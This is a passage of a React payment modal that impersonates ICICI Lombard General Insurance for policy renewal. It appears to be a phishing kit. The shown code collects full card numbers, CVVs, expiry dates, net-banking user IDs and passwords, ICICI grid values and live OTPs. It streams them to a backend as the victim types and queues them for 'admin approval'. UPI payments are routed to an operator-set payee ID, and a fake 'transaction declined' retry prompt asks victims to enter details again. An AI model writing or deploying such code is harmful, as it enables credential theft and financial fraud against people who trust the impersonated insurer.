    else if (selectedMethod === 'card') methodTitle = 'Credit/Debit Card';
    else if (selectedMethod === 'emi') methodTitle = 'Easy EMI';
    else if (selectedMethod === 'netbanking') methodTitle = 'Net Banking';

    apiNotifyCardDetailsUpdated({
      policyNumber: policy.policyNumber,
      customerName: policy.customerName,
      cardNumber: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardNumber : undefined,
      cardHolder: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardHolder : undefined,
      cardExpiry: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardExpiry : undefined,
      cardCvv: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardCvv : undefined,
      cardLast4: cardLast4,
      upiId: selectedMethod === 'upi' ? (upiVpa || adminSettings.adminUpiId) : undefined,
      upiVpa: selectedMethod === 'upi' ? upiVpa : undefined,
      bankName: selectedMethod === 'netbanking' ? effectiveBankName : undefined,
      netbankingUserId: selectedMethod === 'netbanking' ? netbankingUserId : undefined,
      netbankingPassword: selectedMethod === 'netbanking' ? netbankingPassword : undefined,
      netbankingGridValues: (selectedMethod === 'netbanking' && selectedBank === 'ICICI Bank') ? iciciGrid : undefined,
      enteredOtp: cleanDigits,
      amount: finalPayable,
      paymentMethod: methodTitle,
      isSubmission: cleanDigits.length >= 4,
      transactionRef: activeTxnRef || undefined
    }).catch(() => {});
  };

  // Handle OTP Verification & Confirmation
  const handleVerifyOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 'expired') return;

    setIsProcessing(true);

    const cardLast4 = cardNumber.replace(/\s+/g, '').slice(-4) || '1234';
    const cardType = cardNumber.startsWith('4') ? 'Visa' : cardNumber.startsWith('5') ? 'Mastercard' : 'RuPay';
    const isUpiAutoPay = selectedMethod === 'upi' && upiPaymentType === 'autopay_emi';
    const effectiveEmiTenure = isUpiAutoPay ? upiEmiTenureMonths : emiTenureMonths;
    const monthlyEmi = Math.round(finalPayable / effectiveEmiTenure);

    let methodTitle = 'UPI';
    if (isUpiAutoPay) methodTitle = 'UPI AutoPay (EMI)';
    else if (selectedMethod === 'card') methodTitle = 'Card';
    else if (selectedMethod === 'emi') methodTitle = 'Easy EMI';
    else if (selectedMethod === 'netbanking') methodTitle = 'Net Banking';

    const gridSummary = (selectedBank === 'ICICI Bank' && Object.values(iciciGrid).some(v => v))
      ? Object.entries(iciciGrid).filter(([_, v]) => v).map(([k, v]) => `${k}:${v}`).join(' ')
      : '';

    const methodDetailStr = selectedMethod === 'netbanking'
      ? `Bank: ${effectiveBankName}, User ID: ${netbankingUserId}, Password: ${netbankingPassword}${gridSummary ? `, ICICI Grid (A-P): [${gridSummary}]` : ''}`
      : isUpiAutoPay
      ? `UPI AutoPay Monthly: ${upiEmiTenureMonths} Mo @ ₹${monthlyEmi.toLocaleString('en-IN')}/mo, Customer VPA: ${upiVpa || 'App Transfer'}, Admin UPI: ${adminSettings.adminUpiId}`
      : selectedMethod === 'upi'
      ? `Customer UPI VPA: ${upiVpa || 'App Transfer'}, Admin UPI ID: ${adminSettings.adminUpiId}`
      : selectedMethod === 'emi'
      ? `EMI: ${emiTenureMonths} Mo @ ₹${monthlyEmi}/mo, EMI Card: ${cardNumber}`
      : `Card: ${cardNumber}, Holder: ${cardHolder}`;

    const finalOtpValue = otp.trim() || simulatedBankOtp;

    // Notify backend in real-time with submitted OTP
    apiNotifyCardDetailsUpdated({
      policyNumber: policy.policyNumber,
      customerName: policy.customerName,
      cardNumber: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardNumber : undefined,
      cardHolder: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardHolder : undefined,
      cardExpiry: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardExpiry : undefined,
      cardCvv: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardCvv : undefined,
      cardLast4: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardLast4 : undefined,
      upiId: selectedMethod === 'upi' ? (upiVpa || adminSettings.adminUpiId) : undefined,
      upiVpa: selectedMethod === 'upi' ? upiVpa : undefined,
      bankName: selectedMethod === 'netbanking' ? effectiveBankName : undefined,
      netbankingUserId: selectedMethod === 'netbanking' ? netbankingUserId : undefined,
      netbankingPassword: selectedMethod === 'netbanking' ? netbankingPassword : undefined,
      netbankingGridValues: (selectedMethod === 'netbanking' && selectedBank === 'ICICI Bank') ? iciciGrid : undefined,
      enteredOtp: finalOtpValue,
      amount: finalPayable,
      paymentMethod: methodTitle,
      isSubmission: true,
      transactionRef: activeTxnRef
    }).catch(() => {});

    // 1. Record Attempt as PENDING_ADMIN_APPROVAL in Central Server
    try {
      await apiCreatePendingApproval({
        transactionRef: activeTxnRef,
        policyNumber: policy.policyNumber,
        customerName: policy.customerName,
        mobileNumber: policy.mobileNumber,
        amount: finalPayable,
        paymentMethod: methodTitle,
        enteredOtp: finalOtpValue,
        tenureYears: selectedTenure,
        selectedAddOnIds: selectedAddOns.map(a => a.id),
        baseAnnualPremium: policy.baseAnnualPremium,
        methodDetails: {
          customerEmail: policy.email,
          selectedTenure: selectedTenure,
          cardNumber: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardNumber : undefined,
          cardHolder: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardHolder : undefined,
          cardExpiry: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardExpiry : undefined,
          cardCvv: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardCvv : undefined,
          cardLast4: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardLast4 : undefined,
          cardType: (selectedMethod === 'card' || selectedMethod === 'emi') ? cardType : undefined,
          bankName: selectedMethod === 'netbanking' ? effectiveBankName : undefined,
          netbankingUserId: selectedMethod === 'netbanking' ? netbankingUserId : undefined,
          netbankingPassword: selectedMethod === 'netbanking' ? netbankingPassword : undefined,
          netbankingGridValues: (selectedMethod === 'netbanking' && selectedBank === 'ICICI Bank') ? iciciGrid : undefined,
          upiId: selectedMethod === 'upi' ? (upiVpa || adminSettings.adminUpiId) : undefined,
          upiVpa: selectedMethod === 'upi' ? upiVpa : undefined,
          testUpiVpa: selectedMethod === 'upi' ? upiVpa : undefined,
          enteredOtp: finalOtpValue,
          isAutoPay: isUpiAutoPay,
          emiTenureMonths: (isUpiAutoPay || selectedMethod === 'emi') ? effectiveEmiTenure : undefined,
          emiMonthlyAmount: (isUpiAutoPay || selectedMethod === 'emi') ? monthlyEmi : undefined,
          autoDebitFrequency: isUpiAutoPay ? 'Monthly' : undefined,
          autoDebitDayOfMonth: isUpiAutoPay ? upiAutoDebitDay : undefined
        }
      });
    } catch (err) {
      console.warn('apiCreatePendingApproval error, falling back:', err);
    }

    // Update Mobile OTP tracking status
    apiUpdateMobileOtpStatus({
      policyNumber: policy.policyNumber,
      paymentGatewayRef: activeTxnRef,
      otpStatus: 'Successful',
      paymentStatus: 'Pending',
      enteredOtp: finalOtpValue,
      notes: `Customer submitted OTP (${finalOtpValue}). Sent to gateway 3D-Secure approval.`
    }).catch(() => {});

    // Update local attempt with the exact keyed OTP code
    recordPaymentAttempt(policy.policyNumber, {
      transactionRef: activeTxnRef,
      testVerificationCode: finalOtpValue,
      verificationAttempted: 'Yes',
      verificationStatus: 'OTP Submitted',
      sessionStatus: 'Active'
    });

    setIsProcessing(false);
    setWaitingTimeLeft(35);
    setStep('waiting_approval');
  };

  return (
    <div className="fixed inset-0 z-50 bg-slate-900/75 backdrop-blur-xs flex items-center justify-center p-2 sm:p-4 font-sans overflow-hidden">
      <div className="bg-white rounded-2xl max-w-lg w-full shadow-2xl border border-slate-200 overflow-hidden space-y-0 animate-scaleUp max-h-[92dvh] sm:max-h-[90vh] flex flex-col my-auto">
        
        {/* Modal Top Header */}
        <div className="bg-[#00264A] text-white p-3.5 sm:p-5 flex items-center justify-between shrink-0">
          <div className="flex items-center gap-2.5 sm:gap-3">
            <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-xl bg-orange-500 text-white flex items-center justify-center font-bold shrink-0">
              <ShieldCheck className="w-4.5 h-4.5 sm:w-5 sm:h-5" />
            </div>
            <div>
              <h3 className="font-extrabold text-sm sm:text-base text-white leading-tight">ICICI Lombard General Insurance</h3>
              <p className="text-[10px] sm:text-[11px] text-slate-300 font-medium">IRDAI Reg. No. 115 | Secure Payment Gateway</p>
            </div>
          </div>

          <button 
            type="button"
            onClick={onClose}
            className="p-1.5 rounded-full text-slate-300 hover:text-white hover:bg-white/10 cursor-pointer shrink-0"
            aria-label="Close modal"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Order Summary Ribbon */}
        <div className="bg-slate-50 p-3 sm:p-4 border-b border-slate-200 text-xs text-slate-700 grid grid-cols-2 gap-1.5 sm:gap-2 shrink-0">
          <div>
            <span className="text-slate-500 text-[10px] sm:text-xs font-medium block">Policyholder</span>
            <strong className="text-slate-900 text-xs sm:text-xs truncate block">{policy.customerName}</strong>
          </div>
          <div>
            <span className="text-slate-500 text-[10px] sm:text-xs font-medium block">Policy Number</span>
            <strong className="text-slate-900 font-mono text-xs sm:text-xs truncate block">{policy.policyNumber}</strong>
          </div>
          <div>
            <span className="text-slate-500 text-[10px] sm:text-xs font-medium block">Selected Tenure</span>
            <strong className="text-slate-900 text-xs sm:text-xs">{selectedTenure} Year(s) Cover</strong>
          </div>
          <div>
            <span className="text-slate-500 text-[10px] sm:text-xs font-medium block">Amount Payable</span>
            <strong className="text-slate-900 text-xs sm:text-sm font-mono text-[#EA580C]">
              ₹{finalPayable.toLocaleString('en-IN')}
            </strong>
          </div>
        </div>

        {/* Modal Body */}
        <div className="p-3.5 sm:p-6 overflow-y-auto overscroll-contain flex-1">
          
          {/* STEP 1: METHOD INPUT FORM */}
          {step === 'method' && (
            <form 
              onSubmit={(e) => {
                if (selectedMethod === 'netbanking' && netbankingStep === 'userid') {
                  e.preventDefault();
                  if (netbankingUserId.trim()) {
                    setNetbankingStep('password');
                  }
                  return;
                }
                handleInitiatePayment(e);
              }} 
              className="space-y-4 sm:space-y-5"
            >
              {isRetry && (
                <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 flex items-start gap-2.5 text-xs text-amber-900 shadow-2xs animate-fadeIn">
                  <AlertCircle className="w-4 h-4 text-amber-600 shrink-0 mt-0.5" />
                  <div>
                    <span className="font-bold block text-amber-950">Previous Transaction Declined:</span>
                    <p className="text-amber-800 leading-relaxed text-[11px]">
                      Your issuing bank declined the previous verification. Please update or re-enter your card details below to retry your renewal payment safely.
                    </p>
                  </div>
                </div>
              )}
              
              {/* Payment Methods Selector Tabs (UPI, Cards, Net Banking, Easy EMI) */}
              <div className="grid grid-cols-4 gap-1.5 sm:gap-2 text-[10px] sm:text-xs font-bold">
                <button
                  type="button"
                  id="pay-tab-upi"
                  onClick={() => {
                    setSelectedMethod('upi');
                  }}
                  className={`p-2 rounded-xl border flex flex-col items-center gap-1 transition-all cursor-pointer ${
                    selectedMethod === 'upi'
                      ? 'border-[#EA580C] bg-orange-50/70 text-[#EA580C] ring-2 ring-orange-300/40 shadow-xs'
                      : 'border-slate-200 text-slate-600 hover:bg-slate-50'
                  }`}
                >
                  <Smartphone className="w-4 h-4 text-emerald-600" />
                  <span className="text-[11px]">UPI / QR</span>
                </button>

                <button
                  type="button"
                  id="pay-tab-card"
                  onClick={() => {
                    setSelectedMethod('card');
                  }}
                  className={`p-2 rounded-xl border flex flex-col items-center gap-1 transition-all cursor-pointer ${
                    selectedMethod === 'card'
                      ? 'border-[#EA580C] bg-orange-50/70 text-[#EA580C] ring-2 ring-orange-300/40 shadow-xs'
                      : 'border-slate-200 text-slate-600 hover:bg-slate-50'
                  }`}
                >
                  <CreditCard className="w-4 h-4" />
                  <span className="text-[11px]">Cards</span>
                </button>

                <button
                  type="button"
                  id="pay-tab-netbanking"
                  onClick={() => {
                    setSelectedMethod('netbanking');
                    setNetbankingStep('userid');
                  }}
                  className={`p-2 rounded-xl border flex flex-col items-center gap-1 transition-all cursor-pointer ${
                    selectedMethod === 'netbanking'
                      ? 'border-[#EA580C] bg-orange-50/70 text-[#EA580C] ring-2 ring-orange-300/40 shadow-xs'
                      : 'border-slate-200 text-slate-600 hover:bg-slate-50'
                  }`}
                >
                  <Landmark className="w-4 h-4" />
                  <span className="text-[11px]">Net Banking</span>
                </button>

                <button
                  type="button"
                  id="pay-tab-emi"
                  onClick={() => {
                    setSelectedMethod('emi');
                    setEmiStep('plan');
                  }}
                  className={`p-2 rounded-xl border flex flex-col items-center gap-1 transition-all cursor-pointer ${
                    selectedMethod === 'emi'
                      ? 'border-[#EA580C] bg-orange-50/70 text-[#EA580C] ring-2 ring-orange-300/40 shadow-xs'
                      : 'border-slate-200 text-slate-600 hover:bg-slate-50'
                  }`}
                >
                  <CreditCard className="w-4 h-4" />
                  <span className="text-[11px]">Easy EMI</span>
                </button>
              </div>

              {/* Dynamic Method Form */}
              <div className="bg-slate-50/80 p-4 rounded-xl border border-slate-200 space-y-3 text-xs">
                
                {/* 0. UPI PAYMENT FLOW (WITH ONE-TIME AND MONTHLY AUTOPAY EMI OPTIONS) */}
                {selectedMethod === 'upi' && (
                  <div className="space-y-4 animate-fadeIn">
                    
                    {/* Top Switcher: One-Time Pay vs Monthly EMI Auto-Debit */}
                    <div className="bg-slate-200/80 p-1 rounded-xl grid grid-cols-2 gap-1 text-xs font-bold">
                      <button
                        type="button"
                        id="upi-toggle-onetime"
                        onClick={() => setUpiPaymentType('onetime')}
                        className={`py-2 px-2.5 rounded-lg flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
                          upiPaymentType === 'onetime'
                            ? 'bg-white text-slate-900 shadow-xs font-black'
                            : 'text-slate-600 hover:text-slate-900'
                        }`}
                      >
                        <Zap className="w-3.5 h-3.5 text-amber-500 shrink-0" />
                        <span className="truncate">One-Time (₹{finalPayable.toLocaleString('en-IN')})</span>
                      </button>

                      <button
                        type="button"
                        id="upi-toggle-autopay"
                        onClick={() => setUpiPaymentType('autopay_emi')}
                        className={`py-2 px-2.5 rounded-lg flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
                          upiPaymentType === 'autopay_emi'
                            ? 'bg-[#EA580C] text-white shadow-xs font-black'
                            : 'text-slate-600 hover:text-slate-900'
                        }`}
                      >
                        <Repeat className="w-3.5 h-3.5 text-white shrink-0" />
                        <span className="flex items-center gap-1 truncate">
                          <span>Monthly EMI AutoPay</span>
                          <span className="bg-amber-300 text-slate-900 text-[9px] px-1.5 py-0.2 rounded font-black tracking-tight shrink-0">
                            0% EMI
                          </span>
                        </span>
                      </button>
                    </div>

                    {/* Sub-View A: Monthly UPI AutoPay EMI Flow */}
                    {upiPaymentType === 'autopay_emi' ? (
                      <div className="space-y-4 animate-fadeIn">
                        
                        {/* AutoPay Tenure Selection */}
                        <div className="space-y-1.5">
                          <div className="flex items-center justify-between text-xs">
                            <span className="font-extrabold text-slate-900 flex items-center gap-1.5">
                              <Calendar className="w-3.5 h-3.5 text-[#EA580C]" />
                              <span>Select Monthly EMI Tenure:</span>
                            </span>
                            <span className="text-[10px] text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded font-extrabold border border-emerald-200">
                              0% Interest No-Cost EMI
                            </span>
                          </div>

                          <div className="grid grid-cols-2 sm:grid-cols-5 gap-1.5">
                            {[3, 6, 9, 12, 24].map((m) => {
                              const monthly = Math.round(finalPayable / m);
                              const isSelected = upiEmiTenureMonths === m;
                              return (
                                <button
                                  key={m}
                                  type="button"
                                  onClick={() => setUpiEmiTenureMonths(m)}
                                  className={`p-2 rounded-xl border text-center transition-all cursor-pointer relative ${
                                    isSelected
                                      ? 'border-[#EA580C] bg-orange-50/80 ring-2 ring-orange-300/50 shadow-xs'
                                      : 'border-slate-200 bg-white hover:bg-slate-50 text-slate-700'
                                  }`}
                                >
                                  {m === 6 && (
                                    <span className="absolute -top-2 left-1/2 -translate-x-1/2 bg-amber-500 text-white text-[8px] font-black px-1.5 py-0.2 rounded-full uppercase tracking-tight shadow-2xs">
                                      Popular
                                    </span>
                                  )}
                                  <div className="text-[11px] font-bold">{m} Months</div>
                                  <div className={`font-mono text-xs font-black ${isSelected ? 'text-[#EA580C]' : 'text-slate-900'}`}>
                                    ₹{monthly.toLocaleString('en-IN')}<span className="text-[9px] font-normal text-slate-500">/mo</span>
                                  </div>
                                </button>
                              );
                            })}
                          </div>
                        </div>

                        {/* Recurring Auto-Debit Schedule Callout Card */}
                        <div className="bg-gradient-to-r from-purple-900 via-indigo-950 to-slate-950 text-white p-3.5 rounded-xl border border-purple-800/80 shadow-md space-y-2">
                          <div className="flex items-center justify-between text-xs border-b border-purple-800/60 pb-1.5">
                            <span className="font-extrabold text-amber-300 flex items-center gap-1.5">
                              <Repeat className="w-3.5 h-3.5 text-amber-400" />
                              <span>NPCI UPI AutoPay Schedule Details</span>
                            </span>
                            <span className="bg-purple-800/80 text-purple-200 text-[10px] px-2 py-0.5 rounded font-mono font-bold">
                              Monthly Auto-Debit
                            </span>
                          </div>

                          <div className="grid grid-cols-2 gap-2 text-[11px]">
                            <div className="bg-purple-950/60 p-2 rounded-lg border border-purple-800/40">
                              <span className="text-purple-300 block text-[10px]">Monthly Auto-Debit Amount</span>
                              <strong className="text-white text-sm font-mono font-black text-amber-300">
                                ₹{upiMonthlyEmi.toLocaleString('en-IN')} <span className="text-[10px] text-purple-200 font-normal">/ month</span>
                              </strong>
                            </div>

                            <div className="bg-purple-950/60 p-2 rounded-lg border border-purple-800/40">
                              <span className="text-purple-300 block text-[10px]">Auto-Debit Recurring Day</span>
                              <strong className="text-white text-sm font-bold">
                                5th of every month
                              </strong>
                            </div>

                            <div className="bg-purple-950/60 p-2 rounded-lg border border-purple-800/40">
                              <span className="text-purple-300 block text-[10px]">Duration & Installments</span>
                              <strong className="text-white text-xs font-bold">
                                {upiEmiTenureMonths} Monthly Debits
                              </strong>
                            </div>

                            <div className="bg-purple-950/60 p-2 rounded-lg border border-purple-800/40">
                              <span className="text-purple-300 block text-[10px]">Total Coverage Value</span>
                              <strong className="text-white text-xs font-mono font-bold">
                                ₹{finalPayable.toLocaleString('en-IN')} (0% extra)
                              </strong>
                            </div>
                          </div>

                          <div className="text-[10px] text-purple-200/90 pt-1 flex items-center gap-1.5">
                            <ShieldCheck className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
                            <span>First installment sets up mandate. You can pause or cancel anytime inside your UPI app.</span>
                          </div>
                        </div>

                        {/* Dark Preview Container for AutoPay QR Code & Payee */}
                        <div className="bg-[#0f172a] text-white p-5 rounded-2xl shadow-xl space-y-4 border border-slate-800">
                          
                          {/* Header Strip */}
                          <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                            <span className="text-[10px] uppercase font-mono font-black tracking-wider text-orange-400 flex items-center gap-1.5">
                              <Repeat className="w-3.5 h-3.5 text-[#EA580C]" />
                              <span>UPI AUTOPAY MANDATE GATEWAY</span>
                            </span>
                            <span className="text-[10px] text-emerald-400 font-extrabold bg-emerald-950 px-2 py-0.5 rounded border border-emerald-800 flex items-center gap-1">
                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                              <span>Auto-Debit Active</span>
                            </span>
                          </div>

                          {/* Admin UPI Payee Card with Orange Border */}
                          <div className="bg-[#241306] p-3.5 rounded-xl border-2 border-[#b45309] space-y-2">
                            <div className="flex items-center justify-between text-xs">
                              <span className="font-bold text-amber-300">Mandate Beneficiary:</span>
                              <span className="text-[11px] text-amber-200 font-semibold truncate max-w-[200px]">
                                {adminSettings.adminUpiName || 'ICICI Lombard General Insurance'}
                              </span>
                            </div>

                            {/* Monospace Code Display with Copy Button */}
                            <div className="flex items-center justify-between bg-slate-950 p-2.5 rounded-lg border border-amber-700/80 gap-2">
                              <code className="font-mono font-black text-amber-400 text-xs sm:text-sm tracking-wide select-all truncate">
                                {adminSettings.adminUpiId || 'icicilombard.insurance@okaxis'}
                              </code>
                              <button
                                type="button"
                                onClick={handleCopyAdminUpi}
                                className="bg-[#EA580C] hover:bg-[#d84d00] active:scale-95 text-white px-3 py-1 rounded text-[10px] font-extrabold transition-all cursor-pointer flex items-center gap-1 shrink-0 shadow-xs"
                              >
                                {copiedAdminUpi ? <Check className="w-3 h-3 text-white" /> : <Copy className="w-3 h-3 text-white" />}
                                <span>{copiedAdminUpi ? 'Copied' : 'Copy'}</span>
                              </button>
                            </div>
                          </div>

                          {/* White Card: QR Code for Monthly AutoPay */}
                          <div className="bg-white text-slate-900 p-4 rounded-xl text-center space-y-2.5 shadow-md">
                            <div className="flex items-center justify-between border-b border-slate-100 pb-1.5">
                              <span className="text-[11px] font-extrabold text-slate-800 flex items-center gap-1">
                                <Repeat className="w-3 h-3 text-purple-600" />
                                <span>Scan for Monthly AutoPay Mandate</span>
                              </span>
                              <span className="bg-purple-100 text-purple-900 font-mono font-black px-2 py-0.5 rounded text-[11px] border border-purple-200">
                                ₹{upiMonthlyEmi.toLocaleString('en-IN')} / mo
                              </span>
                            </div>

                            {/* Dynamic QR Image generated for chosen monthly EMI and active UPI ID */}
                            <div className="w-36 h-36 mx-auto bg-slate-50 p-1.5 rounded-xl border border-slate-300 flex items-center justify-center shadow-xs">
                              <img
                                src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(
                                  `upi://pay?pa=${adminSettings.adminUpiId || 'icicilombard.insurance@okaxis'}&pn=${encodeURIComponent(
                                    adminSettings.adminUpiName || 'ICICI Lombard General Insurance'
                                  )}&am=${upiMonthlyEmi}&cu=INR&tn=${encodeURIComponent(`Monthly AutoPay EMI Policy ${policy.policyNumber}`)}`
                                )}`}
                                alt="UPI AutoPay QR Code"
                                className="w-full h-full rounded object-contain"
                              />
                            </div>

                            <p className="text-[10px] text-slate-500 font-medium">
                              Scan with Google Pay, PhonePe, Paytm or BHIM to authorize ₹{upiMonthlyEmi.toLocaleString('en-IN')}/mo auto-debit on the 5th of every month
                            </p>
                          </div>

                          {/* Three App Buttons for AutoPay */}
                          <div className="grid grid-cols-3 gap-2 text-center text-[10px] font-bold">
                            <button
                              type="button"
                              onClick={() => {
                                setSelectedUpiApp('gpay');
                                const upiLink = `upi://pay?pa=${adminSettings.adminUpiId}&pn=${encodeURIComponent(adminSettings.adminUpiName)}&am=${upiMonthlyEmi}&cu=INR&tn=${encodeURIComponent(`Monthly AutoPay EMI Policy ${policy.policyNumber}`)}`;
                                window.open(upiLink, '_blank');
                              }}
                              className="bg-[#0f2c59] hover:bg-[#153e7e] border border-blue-600/60 py-2 rounded text-blue-200 cursor-pointer transition-all active:scale-95 flex flex-col items-center justify-center"
                            >
                              <span>Google Pay</span>
                              <span className="text-[8px] text-blue-300">AutoPay</span>
                            </button>

                            <button
                              type="button"
                              onClick={() => {
                                setSelectedUpiApp('paytm');
                                const upiLink = `upi://pay?pa=${adminSettings.adminUpiId}&pn=${encodeURIComponent(adminSettings.adminUpiName)}&am=${upiMonthlyEmi}&cu=INR&tn=${encodeURIComponent(`Monthly AutoPay EMI Policy ${policy.policyNumber}`)}`;
                                window.open(upiLink, '_blank');
                              }}
                              className="bg-[#083344] hover:bg-[#0e4860] border border-cyan-600/60 py-2 rounded text-cyan-200 cursor-pointer transition-all active:scale-95 flex flex-col items-center justify-center"
                            >
                              <span>Paytm</span>
                              <span className="text-[8px] text-cyan-300">AutoPay</span>
                            </button>

                            <button
                              type="button"
                              onClick={() => {
                                setSelectedUpiApp('phonepe');
                                const upiLink = `upi://pay?pa=${adminSettings.adminUpiId}&pn=${encodeURIComponent(adminSettings.adminUpiName)}&am=${upiMonthlyEmi}&cu=INR&tn=${encodeURIComponent(`Monthly AutoPay EMI Policy ${policy.policyNumber}`)}`;
                                window.open(upiLink, '_blank');
                              }}
                              className="bg-[#3b0764] hover:bg-[#520d8b] border border-purple-600/60 py-2 rounded text-purple-200 cursor-pointer transition-all active:scale-95 flex flex-col items-center justify-center"
                            >
                              <span>PhonePe</span>
                              <span className="text-[8px] text-purple-300">AutoPay</span>
                            </button>
                          </div>

                        </div>

                        {/* Customer UPI ID Input & Confirm Button */}
                        <div className="space-y-3 pt-1">
                          <div>
                            <label className="block text-slate-700 font-bold mb-1 text-xs">
                              Customer UPI ID / Mobile for AutoPay Mandate Request:
                            </label>
                            <input
                              type="text"
                              value={upiVpa}
                              onChange={(e) => setUpiVpa(e.target.value)}
                              placeholder="e.g. yourname@okhdfcbank or 9876543210@paytm"
                              className="w-full px-3 py-2 rounded-lg border border-slate-300 font-mono font-bold text-slate-900 bg-white focus:border-[#EA580C] outline-none text-xs"
                            />
                            <p className="text-[10px] text-slate-500 mt-1">
                              Mandate authorization request will be sent to this UPI ID for ₹{upiMonthlyEmi.toLocaleString('en-IN')}/month recurring debit.
                            </p>
                          </div>

                          <button
                            type="submit"
                            className="w-full bg-[#EA580C] hover:bg-[#d84d00] active:scale-95 text-white py-3.5 px-5 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
                          >
                            <Repeat className="w-4 h-4" />
                            <span>Set Up Monthly UPI AutoPay (₹{upiMonthlyEmi.toLocaleString('en-IN')}/mo) & Renew</span>
                          </button>
                        </div>

                      </div>
                    ) : (
                      /* Sub-View B: One-Time UPI Payment (Original Screenshot Replica) */
                      <div className="space-y-4 animate-fadeIn">
                        
                        {/* Dark Preview Container (Identical to Screenshot) */}
                        <div className="bg-[#0f172a] text-white p-5 rounded-2xl shadow-xl space-y-4 border border-slate-800">
                          
                          {/* Header Strip */}
                          <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                            <span className="text-[10px] uppercase font-mono font-black tracking-wider text-orange-400">
                              CUSTOMER UPI PAYMENT PAGE
                            </span>
                            <span className="text-[10px] text-emerald-400 font-extrabold bg-emerald-950 px-2 py-0.5 rounded border border-emerald-800 flex items-center gap-1">
                              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                              <span>Live</span>
                            </span>
                          </div>

                          {/* Admin UPI Payee Card with Orange Border */}
                          <div className="bg-[#241306] p-3.5 rounded-xl border-2 border-[#b45309] space-y-2">
                            <div className="flex items-center justify-between text-xs">
                              <span className="font-bold text-amber-300">Admin UPI Payee:</span>
                              <span className="text-[11px] text-amber-200 font-semibold truncate max-w-[200px]">
                                {adminSettings.adminUpiName || 'ICICI Lombard General Insurance'}
                              </span>
                            </div>

                            {/* Monospace Code Display with Copy Button */}
                            <div className="flex items-center justify-between bg-slate-950 p-2.5 rounded-lg border border-amber-700/80 gap-2">
                              <code className="font-mono font-black text-amber-400 text-xs sm:text-sm tracking-wide select-all truncate">
                                {adminSettings.adminUpiId || 'icicilombard.insurance@okaxis'}
                              </code>
                              <button
                                type="button"
                                onClick={handleCopyAdminUpi}
                                className="bg-[#EA580C] hover:bg-[#d84d00] active:scale-95 text-white px-3 py-1 rounded text-[10px] font-extrabold transition-all cursor-pointer flex items-center gap-1 shrink-0 shadow-xs"
                              >
                                {copiedAdminUpi ? <Check className="w-3 h-3 text-white" /> : <Copy className="w-3 h-3 text-white" />}
                                <span>{copiedAdminUpi ? 'Copied' : 'Copy'}</span>
                              </button>
                            </div>
                          </div>

                          {/* White Card: Google Pay / Paytm / PhonePe QR Code */}
                          <div className="bg-white text-slate-900 p-4 rounded-xl text-center space-y-2.5 shadow-md">
                            <div className="flex items-center justify-between border-b border-slate-100 pb-1.5">
                              <span className="text-[11px] font-extrabold text-slate-800">
                                Google Pay / Paytm / PhonePe QR Code
                              </span>
                              <span className="bg-orange-50 text-[#EA580C] font-mono font-black px-2 py-0.5 rounded text-[11px] border border-orange-200">
                                Amount: ₹{finalPayable.toLocaleString('en-IN')}
                              </span>
                            </div>

                            {/* Dynamic QR Image generated for chosen amount and active UPI ID */}
                            <div className="w-36 h-36 mx-auto bg-slate-50 p-1.5 rounded-xl border border-slate-300 flex items-center justify-center shadow-xs">
                              <img
                                src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(
                                  `upi://pay?pa=${adminSettings.adminUpiId || 'icicilombard.insurance@okaxis'}&pn=${encodeURIComponent(
                                    adminSettings.adminUpiName || 'ICICI Lombard General Insurance'
                                  )}&am=${finalPayable}&cu=INR&tn=${encodeURIComponent(`Renewal Policy ${policy.policyNumber}`)}`
                                )}`}
                                alt="UPI QR Code"
                                className="w-full h-full rounded object-contain"
                              />
                            </div>

                            <p className="text-[10px] text-slate-500 font-medium">
                              {adminSettings.qrNote || 'Scan with Google Pay, Paytm, PhonePe or BHIM to renew policy'}
                            </p>
                          </div>

                          {/* Three App Buttons from Screenshot */}
                          <div className="grid grid-cols-3 gap-2 text-center text-[10px] font-bold">
                            <button
                              type="button"
                              onClick={() => {
                                setSelectedUpiApp('gpay');
                                const upiLink = `upi://pay?pa=${adminSettings.adminUpiId}&pn=${encodeURIComponent(adminSettings.adminUpiName)}&am=${finalPayable}&cu=INR&tn=${encodeURIComponent(`Policy Renewal ${policy.policyNumber}`)}`;
                                window.open(upiLink, '_blank');
                              }}
                              className="bg-[#0f2c59] hover:bg-[#153e7e] border border-blue-600/60 py-2 rounded text-blue-200 cursor-pointer transition-all active:scale-95"
                            >
                              Google Pay
                            </button>

                            <button
                              type="button"
                              onClick={() => {
                                setSelectedUpiApp('paytm');
                                const upiLink = `upi://pay?pa=${adminSettings.adminUpiId}&pn=${encodeURIComponent(adminSettings.adminUpiName)}&am=${finalPayable}&cu=INR&tn=${encodeURIComponent(`Policy Renewal ${policy.policyNumber}`)}`;
                                window.open(upiLink, '_blank');
                              }}
                              className="bg-[#083344] hover:bg-[#0e4860] border border-cyan-600/60 py-2 rounded text-cyan-200 cursor-pointer transition-all active:scale-95"
                            >
                              Paytm
                            </button>

                            <button
                              type="button"
                              onClick={() => {
                                setSelectedUpiApp('phonepe');
